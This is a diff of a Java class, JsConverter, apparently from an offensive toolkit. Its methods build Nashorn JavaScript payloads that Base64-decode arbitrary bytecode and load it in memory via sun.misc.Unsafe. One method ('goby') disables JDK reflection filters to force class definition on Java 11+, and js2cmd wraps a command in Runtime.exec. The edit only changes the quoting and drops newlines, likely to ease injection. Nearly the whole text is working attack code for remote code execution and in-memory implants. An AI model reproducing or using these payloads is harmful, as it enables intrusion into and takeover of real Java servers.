@@ -9,200 +9,200 @@ public class JsConverter
 {
     public static String all(String baseCode)
     {
-        String js = "function Base64DecodeToByte(str) {\n" +
-                "    var bt;\n" +
-                "    try {\n" +
-                "        bt = java.lang.Class.forName(\"sun.misc.BASE64Decoder\").newInstance().decodeBuffer(str);\n" +
-                "    } catch (e) {\n" +
-                "        bt = java.util.Base64.getDecoder().decode(str);\n" +
-                "    }\n" +
-                "    return bt;\n" +
-                "}\n" +
-                "\n" +
-                "function defineClass(classBytes) {\n" +
-                "    var theUnsafe = java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");\n" +
-                "    theUnsafe.setAccessible(true);\n" +
-                "    unsafe = theUnsafe.get(null);\n" +
-                "    unsafe.defineAnonymousClass(java.lang.Class.forName(\"java.lang.Class\"), classBytes, null).newInstance();\n" +
-                "}\n" +
-                "\n" +
-                "defineClass(Base64DecodeToByte(\"" + baseCode + "\"));";
+        String js = "function Base64DecodeToByte(str) {" +
+                "    var bt;" +
+                "    try {" +
+                "        bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(str);" +
+                "    } catch (e) {" +
+                "        bt = java.util.Base64.getDecoder().decode(str);" +
+                "    }" +
+                "    return bt;" +
+                "}" +
+                "" +
+                "function defineClass(classBytes) {" +
+                "    var theUnsafe = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
+                "    theUnsafe.setAccessible(true);" +
+                "    unsafe = theUnsafe.get(null);" +
+                "    unsafe.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'), classBytes, null).newInstance();" +
+                "}" +
+                "" +
+                "defineClass(Base64DecodeToByte('" + baseCode + "'));";
         return StringEscapeUtils.escapeJava(js);
     }
 
     public static String defineAnonymous(String baseCode)
     {
-        String js = "function Base64DecodeToByte(str) {\n" +
-                "    var bt;\n" +
-                "    try {\n" +
-                "        bt = java.lang.Class.forName(\"sun.misc.BASE64Decoder\").newInstance().decodeBuffer(str);\n" +
-                "    } catch (e) {\n" +
-                "        bt = java.util.Base64.getDecoder().decode(str);\n" +
-                "    }\n" +
-                "    return bt;\n" +
-                "}\n" +
-                "\n" +
-                "function defineClass(classBytes) {\n" +
-                "    var theUnsafe = java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");\n" +
-                "    theUnsafe.setAccessible(true);\n" +
-                "    unsafe = theUnsafe.get(null);\n" +
-                "    unsafe.defineAnonymousClass(java.lang.Class.forName(\"java.lang.Class\"), classBytes, null).newInstance();\n" +
-                "}\n" +
-                "\n" +
-                "defineClass(Base64DecodeToByte(\"" + baseCode + "\"));";
+        String js = "function Base64DecodeToByte(str) {" +
+                "    var bt;" +
+                "    try {" +
+                "        bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(str);" +
+                "    } catch (e) {" +
+                "        bt = java.util.Base64.getDecoder().decode(str);" +
+                "    }" +
+                "    return bt;" +
+                "}" +
+                "" +
+                "function defineClass(classBytes) {" +
+                "    var theUnsafe = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
+                "    theUnsafe.setAccessible(true);" +
+                "    unsafe = theUnsafe.get(null);" +
+                "    unsafe.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'), classBytes, null).newInstance();" +
+                "}" +
+                "" +
+                "defineClass(Base64DecodeToByte('" + baseCode + "'));";
         return StringEscapeUtils.escapeJava(js);
     }
 
     public static String goby(String baseCode)
     {
-        String js = "try {\n" +
-                "    load(\"nashorn:mozilla_compat.js\");\n" +
-                "} catch (e) {\n" +
-                "}\n" +
-                "\n" +
-                "function getUnsafe() {\n" +
-                "    var theUnsafeMethod =\n" +
-                "        java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");\n" +
-                "    theUnsafeMethod.setAccessible(true);\n" +
-                "    return theUnsafeMethod.get(null);\n" +
-                "}\n" +
-                "\n" +
-                "function removeClassCache(clazz) {\n" +
-                "    var unsafe = getUnsafe();\n" +
-                "    var clazzAnonymousClass = unsafe.defineAnonymousClass(\n" +
-                "        clazz,\n" +
-                "        java.lang.Class.forName(\"java.lang.Class\")\n" +
-                "            .getResourceAsStream(\"Class.class\")\n" +
-                "            .readAllBytes(),\n" +
-                "        null\n" +
-                "    );\n" +
-                "    var reflectionDataField =\n" +
-                "        clazzAnonymousClass.getDeclaredField(\"reflectionData\");\n" +
-                "    unsafe.putObject(clazz, unsafe.objectFieldOffset(reflectionDataField), null);\n" +
-                "}\n" +
-                "\n" +
-                "function bypassReflectionFilter() {\n" +
-                "    var reflectionClass;\n" +
-                "    try {\n" +
-                "        reflectionClass = java.lang.Class.forName(\n" +
-                "            \"jdk.internal.reflect.Reflection\"\n" +
-                "        );\n" +
-                "    } catch (error) {\n" +
-                "        reflectionClass = java.lang.Class.forName(\"sun.reflect.Reflection\");\n" +
-                "    }\n" +
-                "    var unsafe = getUnsafe();\n" +
-                "    var classBuffer = reflectionClass\n" +
-                "        .getResourceAsStream(\"Reflection.class\")\n" +
-                "        .readAllBytes();\n" +
-                "    var reflectionAnonymousClass = unsafe.defineAnonymousClass(\n" +
-                "        reflectionClass,\n" +
-                "        classBuffer,\n" +
-                "        null\n" +
-                "    );\n" +
-                "    var fieldFilterMapField =\n" +
-                "        reflectionAnonymousClass.getDeclaredField(\"fieldFilterMap\");\n" +
-                "    var methodFilterMapField =\n" +
-                "        reflectionAnonymousClass.getDeclaredField(\"methodFilterMap\");\n" +
-                "    if (\n" +
-                "        fieldFilterMapField\n" +
-                "            .getType()\n" +
-                "            .isAssignableFrom(java.lang.Class.forName(\"java.util.HashMap\"))\n" +
-                "    ) {\n" +
-                "        unsafe.putObject(\n" +
-                "            reflectionClass,\n" +
-                "            unsafe.staticFieldOffset(fieldFilterMapField),\n" +
-                "            java.lang.Class.forName(\"java.util.HashMap\")\n" +
-                "                .getConstructor()\n" +
-                "                .newInstance()\n" +
-                "        );\n" +
-                "    }\n" +
-                "    if (\n" +
-                "        methodFilterMapField\n" +
-                "            .getType()\n" +
-                "            .isAssignableFrom(java.lang.Class.forName(\"java.util.HashMap\"))\n" +
-                "    ) {\n" +
-                "        unsafe.putObject(\n" +
-                "            reflectionClass,\n" +
-                "            unsafe.staticFieldOffset(methodFilterMapField),\n" +
-                "            java.lang.Class.forName(\"java.util.HashMap\")\n" +
-                "                .getConstructor()\n" +
-                "                .newInstance()\n" +
-                "        );\n" +
-                "    }\n" +
-                "    removeClassCache(java.lang.Class.forName(\"java.lang.Class\"));\n" +
-                "}\n" +
-                "\n" +
-                "function setAccessible(accessibleObject) {\n" +
-                "    var unsafe = getUnsafe();\n" +
-                "    var overrideField = java.lang.Class.forName(\n" +
-                "        \"java.lang.reflect.AccessibleObject\"\n" +
-                "    ).getDeclaredField(\"override\");\n" +
-                "    var offset = unsafe.objectFieldOffset(overrideField);\n" +
-                "    unsafe.putBoolean(accessibleObject, offset, true);\n" +
-                "}\n" +
-                "\n" +
-                "function defineClass(bytes) {\n" +
-                "    var clz = null;\n" +
-                "    var version = java.lang.System.getProperty(\"java.version\");\n" +
-                "    var unsafe = getUnsafe();\n" +
-                "    var classLoader = new java.net.URLClassLoader(\n" +
-                "        java.lang.reflect.Array.newInstance(\n" +
-                "            java.lang.Class.forName(\"java.net.URL\"),\n" +
-                "            0\n" +
-                "        )\n" +
-                "    );\n" +
-                "    try {\n" +
-                "        if (version.split(\".\")[0] >= 11) {\n" +
-                "            bypassReflectionFilter();\n" +
-                "            defineClassMethod = java.lang.Class.forName(\n" +
-                "                \"java.lang.ClassLoader\"\n" +
-                "            ).getDeclaredMethod(\n" +
-                "                \"defineClass\",\n" +
-                "                java.lang.Class.forName(\"[B\"),\n" +
-                "                java.lang.Integer.TYPE,\n" +
-                "                java.lang.Integer.TYPE\n" +
-                "            );\n" +
-                "            setAccessible(defineClassMethod);\n" +
-                "            clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);\n" +
-                "        } else {\n" +
-                "            var protectionDomain = new java.security.ProtectionDomain(\n" +
-                "                new java.security.CodeSource(\n" +
-                "                    null,\n" +
-                "                    java.lang.reflect.Array.newInstance(\n" +
-                "                        java.lang.Class.forName(\"java.security.cert.Certificate\"),\n" +
-                "                        0\n" +
-                "                    )\n" +
-                "                ),\n" +
-                "                null,\n" +
-                "                classLoader,\n" +
-                "                []\n" +
-                "            );\n" +
-                "            clz = unsafe.defineClass(\n" +
-                "                null,\n" +
-                "                bytes,\n" +
-                "                0,\n" +
-                "                bytes.length,\n" +
-                "                classLoader,\n" +
-                "                protectionDomain\n" +
-                "            );\n" +
-                "        }\n" +
-                "    } catch (error) {\n" +
-                "        error.printStackTrace();\n" +
-                "    } finally {\n" +
-                "        return clz;\n" +
-                "    }\n" +
-                "}\n" +
-                "\n" +
-                "function base64DecodeToByte(str) {\n" +
-                "    var bt;\n" +
-                "    try {\n" +
-                "        bt = java.lang.Class.forName(\"sun.misc.BASE64Decoder\").newInstance().decodeBuffer(str);\n" +
-                "    } catch (e) {\n" +
-                "        bt = java.lang.Class.forName(\"java.util.Base64\").newInstance().getDecoder().decode(str);\n" +
-                "    }\n" +
-                "    return bt;\n" +
-                "}\n" +
-                "clz = defineClass(base64DecodeToByte(\"" + baseCode + "\"));\n" +
+        String js = "try {" +
+                "    load('nashorn:mozilla_compat.js');" +
+                "} catch (e) {" +
+                "}" +
+                "" +
+                "function getUnsafe() {" +
+                "    var theUnsafeMethod =" +
+                "        java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
+                "    theUnsafeMethod.setAccessible(true);" +
+                "    return theUnsafeMethod.get(null);" +
+                "}" +
+                "" +
+                "function removeClassCache(clazz) {" +
+                "    var unsafe = getUnsafe();" +
+                "    var clazzAnonymousClass = unsafe.defineAnonymousClass(" +
+                "        clazz," +
+                "        java.lang.Class.forName('java.lang.Class')" +
+                "            .getResourceAsStream('Class.class')" +
+                "            .readAllBytes()," +
+                "        null" +
+                "    );" +
+                "    var reflectionDataField =" +
+                "        clazzAnonymousClass.getDeclaredField('reflectionData');" +
+                "    unsafe.putObject(clazz, unsafe.objectFieldOffset(reflectionDataField), null);" +
+                "}" +
+                "" +
+                "function bypassReflectionFilter() {" +
+                "    var reflectionClass;" +
+                "    try {" +
+                "        reflectionClass = java.lang.Class.forName(" +
+                "            'jdk.internal.reflect.Reflection'" +
+                "        );" +
+                "    } catch (error) {" +
+                "        reflectionClass = java.lang.Class.forName('sun.reflect.Reflection');" +
+                "    }" +
+                "    var unsafe = getUnsafe();" +
+                "    var classBuffer = reflectionClass" +
+                "        .getResourceAsStream('Reflection.class')" +
+                "        .readAllBytes();" +
+                "    var reflectionAnonymousClass = unsafe.defineAnonymousClass(" +
+                "        reflectionClass," +
+                "        classBuffer," +
+                "        null" +
+                "    );" +
+                "    var fieldFilterMapField =" +
+                "        reflectionAnonymousClass.getDeclaredField('fieldFilterMap');" +
+                "    var methodFilterMapField =" +
+                "        reflectionAnonymousClass.getDeclaredField('methodFilterMap');" +
+                "    if (" +
+                "        fieldFilterMapField" +
+                "            .getType()" +
+                "            .isAssignableFrom(java.lang.Class.forName('java.util.HashMap'))" +
+                "    ) {" +
+                "        unsafe.putObject(" +
+                "            reflectionClass," +
+                "            unsafe.staticFieldOffset(fieldFilterMapField)," +
+                "            java.lang.Class.forName('java.util.HashMap')" +
+                "                .getConstructor()" +
+                "                .newInstance()" +
+                "        );" +
+                "    }" +
+                "    if (" +
+                "        methodFilterMapField" +
+                "            .getType()" +
+                "            .isAssignableFrom(java.lang.Class.forName('java.util.HashMap'))" +
+                "    ) {" +
+                "        unsafe.putObject(" +
+                "            reflectionClass," +
+                "            unsafe.staticFieldOffset(methodFilterMapField)," +
+                "            java.lang.Class.forName('java.util.HashMap')" +
+                "                .getConstructor()" +
+                "                .newInstance()" +
+                "        );" +
+                "    }" +
+                "    removeClassCache(java.lang.Class.forName('java.lang.Class'));" +
+                "}" +
+                "" +
+                "function setAccessible(accessibleObject) {" +
+                "    var unsafe = getUnsafe();" +
+                "    var overrideField = java.lang.Class.forName(" +
+                "        'java.lang.reflect.AccessibleObject'" +
+                "    ).getDeclaredField('override');" +
+                "    var offset = unsafe.objectFieldOffset(overrideField);" +
+                "    unsafe.putBoolean(accessibleObject, offset, true);" +
+                "}" +
+                "" +
+                "function defineClass(bytes) {" +
+                "    var clz = null;" +
+                "    var version = java.lang.System.getProperty('java.version');" +
+                "    var unsafe = getUnsafe();" +
+                "    var classLoader = new java.net.URLClassLoader(" +
+                "        java.lang.reflect.Array.newInstance(" +
+                "            java.lang.Class.forName('java.net.URL')," +
+                "            0" +
+                "        )" +
+                "    );" +
+                "    try {" +
+                "        if (version.split('.')[0] >= 11) {" +
+                "            bypassReflectionFilter();" +
+                "            defineClassMethod = java.lang.Class.forName(" +
+                "                'java.lang.ClassLoader'" +
+                "            ).getDeclaredMethod(" +
+                "                'defineClass'," +
+                "                java.lang.Class.forName('[B')," +
+                "                java.lang.Integer.TYPE," +
+                "                java.lang.Integer.TYPE" +
+                "            );" +
+                "            setAccessible(defineClassMethod);" +
+                "            clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);" +
+                "        } else {" +
+                "            var protectionDomain = new java.security.ProtectionDomain(" +
+                "                new java.security.CodeSource(" +
+                "                    null," +
+                "                    java.lang.reflect.Array.newInstance(" +
+                "                        java.lang.Class.forName('java.security.cert.Certificate')," +
+                "                        0" +
+                "                    )" +
+                "                )," +
+                "                null," +
+                "                classLoader," +
+                "                []" +
+                "            );" +
+                "            clz = unsafe.defineClass(" +
+                "                null," +
+                "                bytes," +
+                "                0," +
+                "                bytes.length," +
+                "                classLoader," +
+                "                protectionDomain" +
+                "            );" +
+                "        }" +
+                "    } catch (error) {" +
+                "        error.printStackTrace();" +
+                "    } finally {" +
+                "        return clz;" +
+                "    }" +
+                "}" +
+                "" +
+                "function base64DecodeToByte(str) {" +
+                "    var bt;" +
+                "    try {" +
+                "        bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(str);" +
+                "    } catch (e) {" +
+                "        bt = java.lang.Class.forName('java.util.Base64').newInstance().getDecoder().decode(str);" +
+                "    }" +
+                "    return bt;" +
+                "}" +
+                "clz = defineClass(base64DecodeToByte('" + baseCode + "'));" +
                 "clz.newInstance();";
         return StringEscapeUtils.escapeJava(js);
     }
@@ -236,7 +236,7 @@ public class JsConverter
 
     public static String js2cmd(String cmd)
     {
-        String js = "java.lang.Runtime.getRuntime().exec(\"" + cmd + "\")";
+        String js = "java.lang.Runtime.getRuntime().exec('" + cmd + "')";
         return StringEscapeUtils.escapeJava(js);
     }
 }
